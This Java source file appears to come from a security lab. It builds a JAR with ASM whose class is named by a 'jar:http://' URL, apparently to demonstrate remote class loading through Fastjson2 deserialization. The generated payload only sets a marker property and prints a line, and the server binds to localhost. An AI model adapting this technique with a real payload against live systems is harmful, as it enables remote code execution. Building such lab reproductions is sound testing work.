package lab.payload;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpServer;
import org.objectweb.asm.ClassWriter;
import org.objectweb.asm.MethodVisitor;
import org.objectweb.asm.Opcodes;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.jar.JarEntry;
import java.util.jar.JarOutputStream;

/**
 * 独立远程 JAR 服务。
 *
 * <p>作为常规仿真环境的一部分，提供固定的 /safe 工件和 /health 健康检查。</p>
 */
public final class UrlNamedPayloadServer {
    private static final int PORT = Integer.getInteger("lab.artifact.port", 19090);
    private static final String HOST =
            System.getProperty("lab.artifact.host", "localhost");
    private static final String BIND_HOST =
            System.getProperty("lab.bind.host", "127.0.0.1");
    private static final String PATH = "/safe";
    private static final String HEALTH_PATH = "/health";
    private static final String ENTRY_NAME = "lab/Allowed/RemoteHarmless.class";
    private static final String MARKER_PROPERTY = "FASTJSON2_DIRECT_FATJAR_MARKER";
    private static final String MARKER_VALUE = "direct-fatjar-remote-class-v1";

    private UrlNamedPayloadServer() {
    }

    public static void main(String[] args) throws Exception {
        byte[] jarBytes = buildJar();
        AtomicInteger requestCount = new AtomicInteger();
        HttpServer server = HttpServer.create(new InetSocketAddress(
                InetAddress.getByName(BIND_HOST), PORT), 0);
        server.createContext(PATH,
                exchange -> serveJar(exchange, jarBytes, requestCount));
        server.createContext(HEALTH_PATH, UrlNamedPayloadServer::serveHealth);

        Runtime.getRuntime().addShutdownHook(new Thread(() -> server.stop(0),
                "url-named-payload-shutdown"));
        server.start();
        printStartupInfo(jarBytes.length);

        new CountDownLatch(1).await();
    }

    private static byte[] buildJar() throws IOException {
        byte[] classBytes = buildRemoteClass();
        ByteArrayOutputStream output = new ByteArrayOutputStream();
        try (JarOutputStream jar = new JarOutputStream(output)) {
            jar.putNextEntry(new JarEntry(ENTRY_NAME));
            jar.write(classBytes);
            jar.closeEntry();
        }
        return output.toByteArray();
    }

    private static byte[] buildRemoteClass() {
        String internalName = "jar:http://" + HOST + ":" + PORT
                + "/safe!/lab/Allowed/RemoteHarmless";
        ClassWriter writer = new ClassWriter(ClassWriter.COMPUTE_MAXS);
        writer.visit(Opcodes.V1_8, Opcodes.ACC_PUBLIC | Opcodes.ACC_SUPER,
                internalName, null, "java/lang/Object", null);

        addConstructor(writer);
        addMarkerInitializer(writer);
        writer.visitEnd();
        return writer.toByteArray();
    }

    private static void addConstructor(ClassWriter writer) {
        MethodVisitor constructor = writer.visitMethod(
                Opcodes.ACC_PUBLIC, "<init>", "()V", null, null);
        constructor.visitCode();
        constructor.visitVarInsn(Opcodes.ALOAD, 0);
        constructor.visitMethodInsn(Opcodes.INVOKESPECIAL, "java/lang/Object",
                "<init>", "()V", false);
        constructor.visitInsn(Opcodes.RETURN);
        constructor.visitMaxs(1, 1);
        constructor.visitEnd();
    }

    private static void addMarkerInitializer(ClassWriter writer) {
        MethodVisitor initializer = writer.visitMethod(
                Opcodes.ACC_STATIC, "<clinit>", "()V", null, null);
        initializer.visitCode();
        initializer.visitLdcInsn(MARKER_PROPERTY);
        initializer.visitLdcInsn(MARKER_VALUE);
        initializer.visitMethodInsn(Opcodes.INVOKESTATIC, "java/lang/System",
                "setProperty", "(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;", false);
        initializer.visitInsn(Opcodes.POP);


        initializer.visitFieldInsn(Opcodes.GETSTATIC, "java/lang/System",
                "out", "Ljava/io/PrintStream;");
        initializer.visitLdcInsn("[remote-payload] marker-only <clinit> executed");
        initializer.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/io/PrintStream",
                "println", "(Ljava/lang/String;)V", false);
        initializer.visitInsn(Opcodes.RETURN);
        initializer.visitMaxs(2, 0);
        initializer.visitEnd();
    }

    private static void serveJar(HttpExchange exchange, byte[] jarBytes,
                                 AtomicInteger requestCount) throws IOException {
        String method = exchange.getRequestMethod();
        if (!"GET".equalsIgnoreCase(method) && !"HEAD".equalsIgnoreCase(method)) {
            exchange.sendResponseHeaders(405, -1);
            exchange.close();
            return;
        }

        int number = requestCount.incrementAndGet();
        exchange.getResponseHeaders().set("Content-Type", "application/java-archive");
        exchange.getResponseHeaders().set("Content-Disposition",
                "attachment; filename=remote-harmless.jar");
        exchange.getResponseHeaders().set("Cache-Control", "no-store");

        if ("HEAD".equalsIgnoreCase(method)) {
            exchange.sendResponseHeaders(200, -1);
            exchange.close();
        } else {
            exchange.sendResponseHeaders(200, jarBytes.length);
            try (OutputStream output = exchange.getResponseBody()) {
                output.write(jarBytes);
            }
        }

        System.out.println(method + " " + PATH + " #" + number
                + " bytes=" + jarBytes.length);
    }

    private static void serveHealth(HttpExchange exchange) throws IOException {
        if (!"GET".equalsIgnoreCase(exchange.getRequestMethod())) {
            exchange.sendResponseHeaders(405, -1);
            exchange.close();
            return;
        }

        byte[] body = "ok".getBytes(StandardCharsets.UTF_8);
        exchange.getResponseHeaders().set("Content-Type", "text/plain; charset=utf-8");
        exchange.sendResponseHeaders(200, body.length);
        try (OutputStream output = exchange.getResponseBody()) {
            output.write(body);
        }
    }

    private static void printStartupInfo(int jarSize) {
        System.out.println("READY http://" + HOST + ":" + PORT + PATH);
        System.out.println("HEALTH http://" + HOST + ":" + PORT + HEALTH_PATH);
        System.out.println("bindHost=" + BIND_HOST);
        System.out.println("typeName=" + typeName());
        System.out.println("jarEntry=" + ENTRY_NAME);
        System.out.println("jarBytes=" + jarSize);
        System.out.println("markerOnly=true; arbitraryPath=false; arbitraryPayload=false");
    }

    private static String typeName() {
        return "jar:http:.." + HOST + ":" + PORT
                + ".safe!.lab.Allowed.RemoteHarmless";
    }
}
